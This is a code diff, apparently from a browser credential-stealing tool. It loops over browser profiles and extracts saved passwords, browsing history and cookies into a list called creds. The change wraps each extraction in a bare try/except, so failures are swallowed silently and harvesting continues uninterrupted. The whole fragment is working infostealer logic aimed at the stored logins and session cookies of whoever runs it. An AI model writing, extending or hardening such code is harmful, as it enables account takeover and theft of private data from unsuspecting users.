@@ -42,27 +42,33 @@ class Main:
                         profiles.append(file)
                 
                 for profile in profiles:
-                    extraction = extractor.Extract(os.path.join(browser, "Local State"))
-                    passwds = extraction.extractPasswords(os.path.join(browser, profile, "Login Data"))
-                    history = extraction.extractHistory(os.path.join(browser, profile, "History"))
-                    cookies = extraction.extractCookies(os.path.join(browser, profile))
+                    try:
+                        extraction = extractor.Extract(os.path.join(browser, "Local State"))
+                        passwds = extraction.extractPasswords(os.path.join(browser, profile, "Login Data"))
+                        history = extraction.extractHistory(os.path.join(browser, profile, "History"))
+                        cookies = extraction.extractCookies(os.path.join(browser, profile))
 
-                    summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
+                        summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
 
-                    creds.append(summary)
+                        creds.append(summary)
+                    except:
+                        pass
 
         for key in extractor.browsers:
             browser = extractor.browsers[key]
 
             if os.path.exists(browser):
-                extraction = extractor.Extract(os.path.join(browser, "Local State"))
-                passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
-                history = extraction.extractHistory(os.path.join(browser, "History"))
-                cookies = extraction.extractCookies(os.path.join(browser))
+                try:
+                    extraction = extractor.Extract(os.path.join(browser, "Local State"))
+                    passwds = extraction.extractPasswords(os.path.join(browser, "Login Data"))
+                    history = extraction.extractHistory(os.path.join(browser, "History"))
+                    cookies = extraction.extractCookies(os.path.join(browser))
 
-                summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
+                    summary = {browser: {"Passwords": passwds, "History": history, "Cookies": cookies}}
 
-                creds.append(summary)
+                    creds.append(summary)
+                except:
+                    pass
         
         return creds
     
